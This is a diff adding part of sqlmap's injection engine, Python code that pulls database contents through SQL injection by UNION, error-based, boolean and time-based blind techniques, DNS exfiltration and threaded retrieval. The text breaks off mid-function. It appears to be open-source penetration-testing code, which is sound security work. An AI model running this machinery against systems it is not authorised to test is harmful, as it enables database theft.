@@ -1,0 +1,903 @@
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
+See the file 'LICENSE' for copying permission
+"""
+
+from __future__ import print_function
+
+import re
+import threading
+import time
+
+from lib.core.agent import agent
+from lib.core.bigarray import BigArray
+from lib.core.common import applyFunctionRecursively
+from lib.core.common import dataToStdout
+from lib.core.common import unArrayizeValue
+from lib.core.datatype import AttribDict
+from lib.utils.progress import ProgressBar
+from lib.utils.safe2bin import safecharencode
+from lib.core.common import Backend
+from lib.core.common import calculateDeltaSeconds
+from lib.core.common import cleanQuery
+from lib.core.common import expandAsteriskForColumns
+from lib.core.common import extractExpectedValue
+from lib.core.common import filterNone
+from lib.core.common import getPublicTypeMembers
+from lib.core.common import getTechnique
+from lib.core.common import getTechniqueData
+from lib.core.common import incrementCounter
+from lib.core.common import hashDBRetrieve
+from lib.core.common import hashDBWrite
+from lib.core.common import initTechnique
+from lib.core.common import isDigit
+from lib.core.common import isNoneValue
+from lib.core.common import isNumPosStrValue
+from lib.core.common import isTechniqueAvailable
+from lib.core.common import parseUnionPage
+from lib.core.common import popValue
+from lib.core.common import pushValue
+from lib.core.common import randomStr
+from lib.core.common import readInput
+from lib.core.common import setTechnique
+from lib.core.common import singleTimeWarnMessage
+from lib.core.compat import xrange
+from lib.core.data import conf
+from lib.core.data import kb
+from lib.core.data import logger
+from lib.core.data import queries
+from lib.core.convert import encodeHex
+from lib.core.convert import getBytes
+from lib.core.convert import getUnicode
+from lib.core.decorators import lockedmethod
+from lib.core.decorators import stackedmethod
+from lib.core.dicts import FROM_DUMMY_TABLE
+from lib.core.enums import CHARSET_TYPE
+from lib.core.enums import DBMS
+from lib.core.enums import EXPECTED
+from lib.core.enums import PAYLOAD
+from lib.core.exception import SqlmapConnectionException
+from lib.core.exception import SqlmapDataException
+from lib.core.exception import SqlmapNotVulnerableException
+from lib.core.exception import SqlmapUserQuitException
+from lib.core.settings import GET_VALUE_UPPERCASE_KEYWORDS
+from lib.core.settings import IS_TTY
+from lib.core.settings import INFERENCE_MARKER
+from lib.core.settings import INVALID_UNICODE_PRIVATE_AREA
+from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
+from lib.core.settings import SQL_SCALAR_REGEX
+from lib.core.settings import UNICODE_ENCODING
+from lib.core.threads import getCurrentThreadData
+from lib.core.threads import runThreads
+from lib.core.threads import setDaemon
+from lib.core.unescaper import unescaper
+from lib.request.connect import Connect as Request
+from lib.request.direct import direct
+from lib.techniques.blind.inference import bisection
+from lib.techniques.blind.inference import queryOutputLength
+from lib.techniques.blind.inference import valueMatchCondition
+from lib.techniques.dns.test import dnsTest
+from lib.techniques.dns.use import dnsUse
+from lib.techniques.error.use import errorUse
+from lib.techniques.union.use import unionUse
+from thirdparty import six
+
+def _goDns(payload, expression):
+    value = None
+
+    if conf.dnsDomain and kb.dnsTest is not False and not kb.testMode and Backend.getDbms() is not None:
+        if kb.dnsTest is None:
+            dnsTest(payload)
+
+        if kb.dnsTest:
+            value = dnsUse(payload, expression)
+
+    return value
+
+def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None, dump=False, field=None):
+    start = time.time()
+    value = None
+    count = 0
+
+    value = _goDns(payload, expression)
+
+    if payload is None:
+        return None
+
+    if value is not None:
+        return value
+
+    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
+
+    if timeBasedCompare and conf.threads > 1 and kb.forceThreads is None:
+        msg = "multi-threading is considered unsafe in "
+        msg += "time-based data retrieval. Are you sure "
+        msg += "of your choice (breaking warranty) [y/N] "
+
+        kb.forceThreads = readInput(msg, default='N', boolean=True)
+
+    if not (timeBasedCompare and kb.dnsTest):
+        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search(r"(COUNT|LTRIM)\(", expression, re.I) and not (timeBasedCompare and not kb.forceThreads):
+
+            if field and re.search(r"\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I):
+                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.MONETDB, DBMS.VERTICA, DBMS.CRATEDB, DBMS.CUBRID):
+                    alias = randomStr(lowercase=True, seed=hash(expression))
+                    expression = "SELECT %s FROM (%s)" % (field if '.' not in field else re.sub(r".+\.", "%s." % alias, field), expression)  # Note: MonetDB as a prime example
+                    expression += " AS %s" % alias
+                else:
+                    expression = "SELECT %s FROM (%s)" % (field, expression)
+
+            if field and conf.hexConvert or conf.binaryFields and field in conf.binaryFields or Backend.getIdentifiedDbms() in (DBMS.RAIMA,):
+                nulledCastedField = agent.nullAndCastField(field)
+                injExpression = expression.replace(field, nulledCastedField, 1)
+            else:
+                injExpression = expression
+            length = queryOutputLength(injExpression, payload)
+        else:
+            length = None
+
+        kb.inferenceMode = True
+        count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar, dump)
+        kb.inferenceMode = False
+
+        if not kb.bruteMode:
+            debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
+            logger.debug(debugMsg)
+
+    return value
+
+def _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
+    outputs = []
+    origExpr = None
+
+    for field in expressionFieldsList:
+        output = None
+
+        if field.startswith("ROWNUM "):
+            continue
+
+        if isinstance(num, int):
+            origExpr = expression
+            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])
+
+        if "ROWNUM" in expressionFieldsList:
+            expressionReplaced = expression
+        else:
+            expressionReplaced = expression.replace(expressionFields, field, 1)
+
+        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)
+
+        if isinstance(num, int):
+            expression = origExpr
+
+        outputs.append(output)
+
+    return outputs
+
+def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, charsetType=None, firstChar=None, lastChar=None, dump=False):
+    """
+    Retrieve the output of a SQL query character by character taking
+    advantage of a blind SQL injection vulnerability on the affected
+    parameter through a bisection algorithm.
+    """
+
+    initTechnique(getTechnique())
+
+    query = agent.prefixQuery(getTechniqueData().vector)
+    query = agent.suffixQuery(query)
+    payload = agent.payload(newValue=query)
+    count = None
+    startLimit = 0
+    stopLimit = None
+    outputs = BigArray()
+
+    if not unpack:
+        return _goInference(payload, expression, charsetType, firstChar, lastChar, dump)
+
+    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)
+
+    rdbRegExp = re.search(r"RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
+    if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):
+        expressionFieldsList = [expressionFields]
+
+    if len(expressionFieldsList) > 1:
+        infoMsg = "the SQL query provided has more than one field. "
+        infoMsg += "sqlmap will now unpack it into distinct queries "
+        infoMsg += "to be able to retrieve the output even if we "
+        infoMsg += "are going blind"
+        logger.info(infoMsg)
+
+    # If we have been here from SQL query/shell we have to check if
+    # the SQL query might return multiple entries and in such case
+    # forge the SQL limiting the query output one entry at a time
+    # NOTE: we assume that only queries that get data from a table
+    # can return multiple entries
+    if fromUser and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I) and hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, "query"):
+        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression)
+
+        if limitCond:
+            test = True
+
+            if stopLimit is None or stopLimit <= 1:
+                if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
+                    test = False
+
+            if test:
+                # Count the number of SQL query entries output. NOTE: COUNT(*) (row count), not
+                # COUNT(<first field>) - the latter excludes NULLs and would drop NULL-valued rows from
+                # the dump (e.g. dumping a single column whose value is NULL on some rows).
+                countField = queries[Backend.getIdentifiedDbms()].count.query % '*'
+                countedExpression = expression.replace(expressionFields, countField, 1)
+
+                if " ORDER BY " in countedExpression.upper():
+                    _ = countedExpression.upper().rindex(" ORDER BY ")
+                    countedExpression = countedExpression[:_]
+
+                if not stopLimit:
+                    count = _goInference(payload, countedExpression, charsetType=CHARSET_TYPE.DIGITS, firstChar=firstChar, lastChar=lastChar)
+
+                    if isNumPosStrValue(count):
+                        count = int(count)
+
+                        if batch or count == 1:
+                            stopLimit = count
+                        else:
+                            message = "the SQL query provided can return "
+                            message += "%d entries. How many " % count
+                            message += "entries do you want to retrieve?\n"
+                            message += "[a] All (default)\n[#] Specific number\n"
+                            message += "[q] Quit"
+                            choice = readInput(message, default='A').upper()
+
+                            if choice == 'A':
+                                stopLimit = count
+
+                            elif choice == 'Q':
+                                raise SqlmapUserQuitException
+
+                            elif isDigit(choice) and int(choice) > 0 and int(choice) <= count:
+                                stopLimit = int(choice)
+
+                                infoMsg = "sqlmap is now going to retrieve the "
+                                infoMsg += "first %d query output entries" % stopLimit
+                                logger.info(infoMsg)
+
+                            elif choice in ('#', 'S'):
+                                message = "how many? "
+                                stopLimit = readInput(message, default="10")
+
+                                if not isDigit(stopLimit):
+                                    errMsg = "invalid choice"
+                                    logger.error(errMsg)
+
+                                    return None
+
+                                else:
+                                    stopLimit = int(stopLimit)
+
+                            else:
+                                errMsg = "invalid choice"
+                                logger.error(errMsg)
+
+                                return None
+
+                    elif count and not isDigit(count):
+                        warnMsg = "it was not possible to count the number "
+                        warnMsg += "of entries for the SQL query provided. "
+                        warnMsg += "sqlmap will assume that it returns only "
+                        warnMsg += "one entry"
+                        logger.warning(warnMsg)
+
+                        stopLimit = 1
+
+                    elif not isNumPosStrValue(count):
+                        if not count:
+                            warnMsg = "the SQL query provided does not "
+                            warnMsg += "return any output"
+                            logger.warning(warnMsg)
+
+                        return None
+
+                elif (not stopLimit or stopLimit == 0):
+                    return None
+
+                try:
+                    try:
+                        for num in xrange(startLimit or 0, stopLimit or 0):
+                            output = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=num, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)
+                            outputs.append(output)
+                    except OverflowError:
+                        errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
+                        errMsg += "with switch '--fresh-queries'"
+                        raise SqlmapDataException(errMsg)
+
+                except KeyboardInterrupt:
+                    print()
+                    warnMsg = "user aborted during dumping phase"
+                    logger.warning(warnMsg)
+
+                return outputs
+
+    elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith("SELECT ") and " FROM " not in expression.upper():
+        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]
+
+    outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)
+
+    return ", ".join(output or "" for output in outputs) if not isNoneValue(outputs) else None
+
+def _goBooleanProxy(expression):
+    """
+    Retrieve the output of a boolean based SQL query
+    """
+
+    initTechnique(getTechnique())
+
+    if conf.dnsDomain:
+        query = agent.prefixQuery(getTechniqueData().vector)
+        query = agent.suffixQuery(query)
+        payload = agent.payload(newValue=query)
+        output = _goDns(payload, expression)
+
+        if output is not None:
+            return output
+
+    vector = getTechniqueData().vector
+    vector = vector.replace(INFERENCE_MARKER, expression)
+    query = agent.prefixQuery(vector)
+    query = agent.suffixQuery(query)
+    payload = agent.payload(newValue=query)
+
+    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)
+
+    output = hashDBRetrieve(expression, checkConf=True)
+
+    if output is None:
+        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)
+
+        if output is not None:
+            hashDBWrite(expression, output)
+
+    return output
+
+def _goUnion(expression, unpack=True, dump=False):
+    """
+    Retrieve the output of a SQL query taking advantage of an union SQL
+    injection vulnerability on the affected parameter.
+    """
+
+    output = unionUse(expression, unpack=unpack, dump=dump)
+
+    if isinstance(output, six.string_types):
+        output = parseUnionPage(output)
+
+    return output
+
+def _verifyInferredValue(expression, value):
+    """
+    Confirm a value-parallel-inferred name with ONE equality boolean (lock-free forged
+    query, mirroring the predictive commonValue check). A wrong bisection bit under heavy
+    concurrent load on a flaky/WAF'd target flips a character; a full-value equality catches
+    it sharply (a corrupted name != the real one). Returns True when (expression) == value
+    holds, or on a transient verify error (never discard a value on a hiccup).
+    """
+
+    if value is None or isNoneValue(value):
+        return True
+
+    value = unArrayizeValue(value)
+    if not isinstance(value, six.string_types):
+        return True
+
+    if Backend.getDbms():
+        _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
+        nulledCastedField = agent.nullAndCastField(fieldToCastStr)
+        expressionUnescaped = unescaper.escape(expression.replace(fieldToCastStr, nulledCastedField, 1))
+    else:
+        expressionUnescaped = unescaper.escape(expression)
+
+    matchCondition = valueMatchCondition(expressionUnescaped, value)
+    if matchCondition is None:   # non-ASCII value: no reliable whole-value equality (see valueMatchCondition)
+        return None              # caller confirms these by an independent re-extraction instead
+
+    query = getTechniqueData().vector.replace(INFERENCE_MARKER, matchCondition)
+    query = agent.suffixQuery(agent.prefixQuery(query))
+
+    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)
+
+    try:
+        result = bool(Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False))
+        incrementCounter(getTechnique())
+        return result
+    except Exception:
+        return True
+
+def valueParallelEligible():
+    """
+    Whether blind enumeration/dumping should take the value-parallel path (one whole value per worker)
+    rather than the classic char loop. It is chosen for concurrency ('--threads') and, independently, to
+    render a single whole-job progress bar/ETA ('--eta'). A concurrency-safe channel - boolean or the
+    HTTP/2 timeless oracle - qualifies with either. Classic time-based qualifies only single-threaded under
+    '--eta': concurrent SLEEP measurements interfere, so it must stay sequential (where it is safe, and
+    still gets the whole-job ETA that matters most for the slowest channel). Callers add their own extra
+    guards (e.g. '--dns-domain', per-column comments).
+    """
+
+    concurrencySafe = isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) or kb.get("timeless") is not None
+
+    if conf.threads > 1:
+        return concurrencySafe
+    if conf.eta:
+        return concurrencySafe or isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME)
+    return False
+
+def _threadedInferenceValues(exprBuilder, indices, context=None, charsetType=None, dump=False):
+    """
+    Value-parallel blind retrieval.
+
+    Retrieve many independent values concurrently, ONE whole value per worker thread, each decoded
+    sequentially via bisection with length=None - so there is NO per-value length probe (unlike the
+    position-parallel path, which must probe LENGTH() to split a value's characters across threads) and
+    the sequential prefix lets predictive inference / low-cardinality guessing / the per-column Huffman
+    model work. This parallelizes across VALUES instead of character positions - the right axis for the
+    MANY short values of table/column NAME enumeration (context="Tables"/"Columns" tags kb.partRun so
+    predictValue() consults the wordlist) and, with dump=True, of per-column data dumping (Huffman and
+    low-cardinality guessing engage). It bypasses getValue()'s @lockedmethod the same way union/error
+    row-threading calls _oneShotUnionUse directly. `exprBuilder(index)` yields the per-value expression.
+    Returns a list aligned with `indices` (None where a value could not be retrieved); single-thread is
+    just sequential retrieval (no worse than the classic loop, and still without the length probe).
+    """
+
+    indices = list(indices)
+
+    # Snapshot the raw per-thread technique (may be None) so the finally can restore it verbatim -
+    # getTechnique() would fall back to kb.technique, and a None result there used to skip the restore
+    # entirely, leaking the BOOLEAN/TIME we set below onto the calling thread for every later caller.
+    savedTechnique = getCurrentThreadData().technique
+
+    if isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN):
+        setTechnique(PAYLOAD.TECHNIQUE.BOOLEAN)
+    elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
+        setTechnique(PAYLOAD.TECHNIQUE.TIME)
+    else:
+        return None
+
+    try:
+        initTechnique(getTechnique())
+        payload = agent.payload(newValue=agent.suffixQuery(agent.prefixQuery(getTechniqueData().vector)))
+    except:
+        setTechnique(savedTechnique)   # these run before the runThreads try/finally below, so restore here too
+        raise
+
+    results = [None] * len(indices)
+    cursor = iter(xrange(len(indices)))
+
+    # With '--eta' show a single value-level bar (values completed / total) instead of the per-value
+    # stream: it is monotonic and carries a meaningful ETA across the whole set, and - unlike the
+    # per-char bar drawn inside bisection() - it survives the worker's disableStdOut (drawn forced,
+    # below), so '--eta' is honoured under '--threads' too. Skipped for trivial single-value sets.
+    etaProgress = ProgressBar(maxValue=len(indices)) if (conf.eta and len(indices) > 1) else None
+    completed = [0]
+
+    def inferenceThread():
+        threadData = getCurrentThreadData()
+        # Each per-value bisection streams its characters to stdout and mirrors them into
+        # threadData.shared.value - which is a PROCESS-GLOBAL object. Left as-is, concurrent
+        # workers interleave their character output (garbled console) and stomp each other's
+        # partial value. So suppress the per-char streaming here and give each worker a private
+        # shared-state object; a single clean line/counter is printed per completed value below.
+        threadData.disableStdOut = True
+        threadData.shared = AttribDict()
+
+        while kb.threadContinue:
+            with kb.locks.limit:
+                try:
+                    slot = next(cursor)
+                except StopIteration:
+                    break
+
+            expression = exprBuilder(indices[slot])
+            try:
+                _, value = bisection(payload, expression, length=None, charsetType=charsetType, dump=dump)
+                # Self-verify each value: sustained concurrent boolean load on a flaky/WAF'd target can flip
+                # a bisection bit (raw retrieval has no per-char validation), so confirm the whole value and
+                # re-extract on mismatch. ASCII values use ONE fast equality probe; a value carrying non-ASCII
+                # (which a quoted literal may not round-trip, AND which is itself a common corruption symptom)
+                # is instead confirmed by an INDEPENDENT re-extraction having to agree - a random flip will not
+                # reproduce the same bytes twice. Bounded to a few tries; correctness over a marginal request.
+                tries = 0
+                while not isNoneValue(value) and not threadData.lowCardHit and tries < 3:
+                    verdict = _verifyInferredValue(expression, value)
+                    if verdict is True:
+                        break
+                    tries += 1
+                    _, other = bisection(payload, expression, length=None, charsetType=charsetType, dump=dump)
+                    if verdict is None and other == value:   # two independent extractions agree -> trust it
+                        break
+                    value = other                            # equality said wrong, or the two disagree -> adopt fresh, recheck
+            except Exception as ex:
+                logger.debug("parallel retrieval worker failed at slot %d ('%s')" % (slot, ex))
+                value = None
+
+            with kb.locks.value:
+                results[slot] = value
+
+            if etaProgress is not None:
+                with kb.locks.io:
+                    completed[0] += 1
+                    threadData.disableStdOut = False        # let the value-level bar through (per-char streaming stays muted)
+                    try:
+                        etaProgress.progress(completed[0])
+                    finally:
+                        threadData.disableStdOut = True
+
+            # Stream each retrieved value as it completes (they arrive out of order under threads, exactly
+            # like the error/union dumps), so a dump shows its data live rather than a silent counter.
+            elif conf.verbose >= 1 and not kb.bruteMode and not isNoneValue(value):
+                with kb.locks.io:
+                    rendered = safecharencode(unArrayizeValue(value))
+                    dataToStdout("[%s] [INFO] retrieved: %s\n" % (time.strftime("%X"), "'%s'" % rendered if dump else rendered), forceOutput=True)
+
+    # Keep the '--eta' countdown live between value updates: a value (esp. time-based) can take many
+    # seconds, so a daemon redraws the bar every second with the ETA decremented by elapsed time (it runs
+    # on its own thread, so it is not muted by the workers' disableStdOut, and shares kb.locks.io with them).
+    etaTickerStop = threading.Event()
+    etaTicker = None
+    if etaProgress is not None and IS_TTY:
+        def _etaTicker():
+            while not etaTickerStop.wait(1.0):
+                with kb.locks.io:
+                    etaProgress.tick()
+        etaTicker = threading.Thread(target=_etaTicker, name="eta-ticker")
+        setDaemon(etaTicker)
+        etaTicker.start()
+
+    # Save/restore the calling thread's state: with a single thread runThreads runs the worker
+    # INLINE on this thread, so the worker's disableStdOut/shared mutations must not leak out.
+    savedPartRun = kb.partRun
+    mainThreadData = getCurrentThreadData()
+    savedStdOut, savedShared = mainThreadData.disableStdOut, mainThreadData.shared
+    kb.partRun = context
+    try:
+        runThreads(min(conf.threads or 1, len(indices)) or 1, inferenceThread)
+    finally:
+        etaTickerStop.set()
+        if etaTicker is not None:
+            etaTicker.join(timeout=2)
+        kb.partRun = savedPartRun
+        mainThreadData.disableStdOut = savedStdOut
+        mainThreadData.shared = savedShared
+        setTechnique(savedTechnique)
+
+    # Robustness: any slot a worker could not retrieve (None, i.e. a transient per-cell failure) is
+    # re-extracted serially via the classic getValue() path - full error handling, and a persistent error
+    # surfaces there - rather than being silently returned as an empty value.
+    for slot in xrange(len(results)):
+        if results[slot] is None and kb.threadContinue:
+            results[slot] = getValue(exprBuilder(indices[slot]), union=False, error=False, dump=dump, charsetType=charsetType)
+
+    return results
+
+def _pageCharsetCorrupted(value):
+    """
+    True if a retrieved value carries reversibly-decoded (undecodable) bytes - a sign that the
+    web page charset could not represent the DBMS data (cf. the 'reversible' codec). Such a
+    UNION/error value is silently corrupt and should be re-fetched via DBMS-side hexadecimal.
+    """
+
+    retVal = [False]
+
+    def _(item):
+        if not retVal[0] and isinstance(item, six.string_types):
+            if re.search(r"\\x[89a-f][0-9a-f]", item) or (INVALID_UNICODE_PRIVATE_AREA and any(0xF0000 <= ord(_) <= 0xF00FF for _ in item)):
+                retVal[0] = True
+        return item
+
+    applyFunctionRecursively(value, _)
+    return retVal[0]
+
+def _looksLikeMisdecodedUtf8(value):
+    """
+    True if a retrieved value looks like UTF-8 data shown through a single-byte (ISO-8859-1) charset -
+    the '<page charset too WIDE>' mismatch that leaves NO undecodable bytes (latin-1 accepts every byte),
+    so _pageCharsetCorrupted() cannot see it, yet the data is silently mojibake (a UTF-8 accent shows as
+    two spurious latin-1 chars).
+
+    Precise by construction: real mojibake re-encodes to latin-1 and decodes back to a DIFFERENT valid
+    UTF-8 string, whereas correctly-decoded UTF-8 ('cafe' with U+00E9) and genuine latin-1 text ('resume')
+    do not (a lone accent is a UTF-8 lead byte with no continuation -> decode fails). So it fires only on
+    the corruption, not on clean data. Complements _pageCharsetCorrupted() (the too-NARROW direction).
+    """
+
+    retVal = [False]
+
+    def _(item):
+        if not retVal[0] and isinstance(item, six.string_types) and any(0x80 <= ord(_) <= 0xFF for _ in item):
+            try:
+                decoded = item.encode("latin-1").decode("utf-8")
+            except (UnicodeEncodeError, UnicodeDecodeError):
+                return item
+            if decoded != item and any(ord(_) > 0x7F for _ in decoded):
+                retVal[0] = True
+        return item
+
+    applyFunctionRecursively(value, _)
+    return retVal[0]
+
+@lockedmethod
+@stackedmethod
+def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):
+    """
+    Called each time sqlmap inject a SQL query on the SQL injection
+    affected parameter.
+    """
+
+    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():
+        if not hasattr(queries[Backend.getIdentifiedDbms()], "hex"):
+            warnMsg = "switch '--hex' is currently not supported on DBMS %s" % Backend.getIdentifiedDbms()
+            singleTimeWarnMessage(warnMsg)
+            conf.hexConvert = False
+        else:
+            charsetType = CHARSET_TYPE.HEXADECIMAL
+
+    kb.safeCharEncode = safeCharEncode
+    kb.resumeValues = resumeValue
+
+    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:
+        expression = re.sub(r"(?i)(\A|\(|\)|\s)%s(\Z|\(|\)|\s)" % keyword, r"\g<1>%s\g<2>" % keyword, expression)
+
+    if suppressOutput is not None:
+        pushValue(getCurrentThreadData().disableStdOut)
+        getCurrentThreadData().disableStdOut = suppressOutput
+
+    try:
+        pushValue(conf.db)
+        pushValue(conf.tbl)
+
+        if expected == EXPECTED.BOOL:
+            forgeCaseExpression = booleanExpression = expression
+
+            if expression.startswith("SELECT "):
+                booleanExpression = "(%s)=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else "1")
+            else:
+                forgeCaseExpression = agent.forgeCaseStatement(expression)
+
+        if conf.direct:
+            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)
+
+        elif any(isTechniqueAvailable(_) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True)):
+            query = cleanQuery(expression)
+            query = expandAsteriskForColumns(query)
+            value = None
+            found = False
+            count = 0
+
+            if query and not re.search(r"COUNT.*FROM.*\(.*DISTINCT", query, re.I):
+                query = query.replace("DISTINCT ", "")
+
+            if not conf.forceDns:
+                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
+                    setTechnique(PAYLOAD.TECHNIQUE.UNION)
+                    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]
+                    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion
+
+                    if expected == EXPECTED.BOOL:
+                        # Note: some DBMSes (e.g. Altibase, SQL Server) don't support implicit conversion of boolean check result during concatenation with prefix and suffix (e.g. 'qjjvq'||(1=1)||'qbbbq')
+
+                        # skip only when already CASE-wrapped or a bare scalar SELECT value (cf. the startswith check above); a boolean predicate that merely EMBEDS a subquery (e.g. '(SELECT ...) IS NULL', common when the DBMS is unidentified and forgeCaseStatement() is a no-op) still needs wrapping for concatenation safety
+                        if "CASE" not in forgeCaseExpression and not forgeCaseExpression.startswith("SELECT "):
+                            forgeCaseExpression = "(CASE WHEN (%s) THEN '1' ELSE '0' END)" % forgeCaseExpression
+
+                    try:
+                        value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
+                    except SqlmapConnectionException:
+                        if not fallback:
+                            raise
+
+                    count += 1
+                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE
+
+                    if not found and fallback:
+                        warnMsg = "something went wrong with full UNION "
+                        warnMsg += "technique (could be because of "
+                        warnMsg += "limitation on retrieved number of entries)"
+                        if " FROM " in query.upper():
+                            warnMsg += ". Falling back to partial UNION technique"
+                            singleTimeWarnMessage(warnMsg)
+
+                            try:
+                                pushValue(kb.forcePartialUnion)
+                                kb.forcePartialUnion = True
+                                value = _goUnion(query, unpack, dump)
+                                found = (value is not None) or (value is None and expectingNone)
+                            finally:
+                                kb.forcePartialUnion = popValue()
+                        else:
+                            singleTimeWarnMessage(warnMsg)
+
+                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:
+                    setTechnique(PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY)
+                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)
+                    count += 1
+                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE
+
+                # Auto-recover from a page/DBMS charset mismatch: a UNION/error value carrying
+                # undecodable bytes (the page charset couldn't represent the DBMS data) is silently
+                # corrupt. Re-fetch it via DBMS-side hex, which travels as ASCII regardless of the
+                # page charset - no user '--hex'/'--encoding' knowledge required. Gated, so clean
+                # or ASCII data pays nothing.
+                if (found and not conf.hexConvert and not conf.binaryFields and expected not in (EXPECTED.BOOL, EXPECTED.INT)
+                        and getTechnique() in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)
+                        and Backend.getIdentifiedDbms() and hasattr(queries[Backend.getIdentifiedDbms()], "hex")
+                        and (_pageCharsetCorrupted(value) or _looksLikeMisdecodedUtf8(value))):
+                    warnMsg = "retrieved data appears corrupted because of a charset mismatch between the "
+                    warnMsg += "DBMS and the web page. Re-fetching using hexadecimal encoding"
+                    singleTimeWarnMessage(warnMsg)
+
+                    conf.hexConvert = True
+                    try:
+                        _value = _goUnion(query, unpack, dump) if getTechnique() == PAYLOAD.TECHNIQUE.UNION else errorUse(query, dump)
+                    finally:
+                        conf.hexConvert = False
+
+                    # only adopt the hex re-fetch if it is actually cleaner: a rare mis-trigger (or a
+                    # column whose real charset the hex decode still cannot resolve) must never replace
+                    # the original with equal-or-worse data
+                    if _value is not None and not _pageCharsetCorrupted(_value) and not _looksLikeMisdecodedUtf8(_value):
+                        value = _value
+
+                if found and conf.dnsDomain:
+                    _ = "".join(filterNone(key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items()))
+                    warnMsg = "option '--dns-domain' will be ignored "
+                    warnMsg += "as faster techniques are usable "
+                    warnMsg += "(%s) " % _
+                    singleTimeWarnMessage(warnMsg)
+
+            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
+                setTechnique(PAYLOAD.TECHNIQUE.BOOLEAN)
+
+                if expected == EXPECTED.BOOL:
+                    value = _goBooleanProxy(booleanExpression)
+                else:
+                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
+
+                count += 1
+                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE
+
+            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:
+                match = re.search(r"\bFROM\b ([^ ]+).+ORDER BY ([^ ]+)", expression)
+                kb.responseTimeMode = "%s|%s" % (match.group(1), match.group(2)) if match else None
+
+                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
+                    setTechnique(PAYLOAD.TECHNIQUE.TIME)
+                else:
+                    setTechnique(PAYLOAD.TECHNIQUE.STACKED)
+
+                if expected == EXPECTED.BOOL:
